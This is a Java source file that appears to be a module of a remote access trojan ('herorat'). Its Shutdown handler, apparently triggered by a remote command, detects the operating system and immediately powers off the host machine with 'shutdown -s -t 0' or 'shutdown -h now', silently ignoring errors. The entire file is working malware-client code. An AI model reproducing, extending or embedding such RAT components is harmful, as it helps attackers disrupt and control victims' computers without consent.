package net.herorat.features.shutdown;

import java.io.DataOutputStream;

public class Shutdown
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		try
		{
			String os = System.getProperty("os.name", "").toLowerCase();
			if (os.contains("win"))
			{
				Runtime.getRuntime().exec("shutdown -s -t 0");
				return;
			}
			else if (os.contains("nux") || os.contains("mac"))
			{
				Runtime.getRuntime().exec("shutdown -h now");
				return;
			}
		}
		catch (Exception e) {}
	}
}